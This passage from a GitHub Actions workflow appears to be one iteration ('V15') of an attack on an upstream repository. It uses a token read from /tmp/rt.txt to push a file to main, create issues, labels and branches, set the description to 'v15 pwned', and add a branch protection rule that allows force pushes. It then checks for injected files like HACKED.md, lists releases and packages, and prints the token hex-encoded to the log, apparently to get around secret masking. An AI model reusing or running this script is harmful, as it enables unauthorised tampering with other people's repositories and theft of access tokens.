            -d "{\"query\":\"mutation{createCommitOnBranch(input:{branch:{repositoryNameWithOwner:\\\"$UPSTREAM_OWNER/$UPSTREAM_REPO\\\",branchName:\\\"main\\\"},message:{headline:\\\"v15\\\"},fileChanges:{additions:[{path:\\\"V15.md\\\",contents:\\\"$B64\\\"}]},expectedHeadOid:\\\"$HEAD\\\"}){commit{oid}}}\"}")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "A = $CODE | $(echo "$BODY" | head -c 200)"

          # B: Issues, discussions, labels
          echo "--- B: Mutations ---"
          for MUTATION in \
            "createIssue(input:{repositoryId:\\\"$REPO_ID\\\",title:\\\"v15\\\"}){issue{number}}" \
            "createLabel(input:{repositoryId:\\\"$REPO_ID\\\",name:\\\"v15-audit\\\",color:\\\"ff0000\\\"}){label{id}}" \
            "updateRepository(input:{repositoryId:\\\"$REPO_ID\\\",description:\\\"v15 pwned\\\"}){repository{description}}" \
            "createRef(input:{repositoryId:\\\"$REPO_ID\\\",name:\\\"refs/heads/v15-gql\\\",oid:\\\"$HEAD\\\"}){ref{name}}" \
            "deleteRef(input:{refId:\\\"$REPO_ID\\\"}){clientMutationId}" \
            "addStar(input:{starrableId:\\\"$REPO_ID\\\"}){starrable{id}}" \
            "createBranchProtectionRule(input:{repositoryId:\\\"$REPO_ID\\\",pattern:\\\"main\\\",allowsForcePushes:true}){branchProtectionRule{id}}"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
              "$GH/graphql" \
              -d "{\"query\":\"mutation{$MUTATION}\"}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            MUT_NAME=$(echo "$MUTATION" | cut -d'(' -f1)
            echo "B $MUT_NAME = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 10: Final verification
      # ══════════════════════════════════════════════════════════════
      - name: Step 10 - Final verification
        if: always()
        run: |
          set +e
          echo "=== V15 FINAL VERIFICATION ==="
          RT=$(cat /tmp/rt.txt 2>/dev/null)
          GH="https://api.github.com"
          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"

          echo "--- Upstream branches ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/branches" \
            | jq -c '.[]? | {name:.name,sha:.commit.sha}' 2>/dev/null

          echo "--- Injected files ---"
          for F in V15.md V14.md V14-GQL.md HACKED.md; do
            R=$(/usr/bin/curl -sS -o /dev/null -w "HTTP_%{http_code}" \
              -H "Authorization: token $RT" "$GH/repos/$UP/contents/$F")
            echo "$F = $R"
          done

          echo "--- Releases ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/releases" \
            | jq -c '.[]? | {id,tag_name,name,prerelease}' 2>/dev/null

          echo "--- Tags ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/tags" \
            | jq -c '.[]? | {name:.name,sha:.commit.sha}' 2>/dev/null

          echo "--- Packages ---"
          for S in "$UPSTREAM_OWNER" "$FORK_OWNER"; do
            for T in npm container; do
              /usr/bin/curl -sS -H "Authorization: token $RT" \
                "$GH/users/$S/packages?package_type=$T" \
                | jq -c '.[]? | {name,package_type,visibility}' 2>/dev/null
            done
          done

          echo "--- Deployments ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP/deployments" \
            | jq -c '.[]? | {id,environment,ref}' 2>/dev/null

          echo "--- Repo state ---"
          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UP" \
            | jq '{description,default_branch,visibility,homepage,archived}'

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
          echo "=== V15 COMPLETE ==="
